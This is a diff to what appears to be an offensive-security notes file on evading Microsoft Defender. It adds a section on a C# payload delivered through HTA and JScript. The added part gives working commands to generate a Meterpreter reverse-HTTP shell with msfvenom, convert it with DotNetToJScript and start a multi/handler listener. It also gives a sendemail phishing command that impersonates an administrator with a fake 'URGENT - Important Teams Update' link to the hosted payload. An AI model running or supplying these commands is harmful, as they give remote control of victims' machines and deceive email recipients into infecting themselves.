@@ -2,6 +2,7 @@
 
 * [Bypass MS Defender](#bypass-ms-defender)
 * [Reverse Shell MS Word Macro](#reverse-shell-ms-word-macro) / DETECTED
+* [C# Payload with HTA and JScript](#csharp-payload-with-hta-and-jscript)
 
 # Bypass MS Defender 
 
@@ -75,5 +76,41 @@ Sub AutoOpen()
 End Sub
 ```
 
+# C# Payload with HTA and JScript
 
+> Create a C# payload with MSFVenom
+
+```shell
+msfvenom -p windows/x64/meterpreter/reverse_http LHOST=kali LPORT=443 EXITFUNC=thread -f csharp
+```
+
+> Clone [DotNetToJScript](https://github.com/tyranid/DotNetToJScript) project and replace MSFVenom output in the buf variable. Then build the solution.
+After building, create the JScript payload.
+
+```shell
+DotNetToJScript.exe ExampleAssembly.dll --lang=JScript --ver=v4 -o payload.js
+```
+
+Create a skeleton .HTA file with JScript tags
+
+```shell
+# To add
+```
+
+> Listen with multi/handler meterpreter
+
+```shell
+msfconsole -q
+use multi/handler
+set payload windows/x64/meterpreter/reverse_http
+set lhost 192.168.0.203
+set lport 443
+run
+```
+
+> Send phishing email. Remember to host the resource.
+
+```shell
+sendemail -f administrator@domain.com -t jose@domain.com -s 192.168.0.203 -u "URGENT - Important Teams Update" -m "Please click on this link to update Teams - http://192.168.0.203/teamsHTA.hta"
+```
 
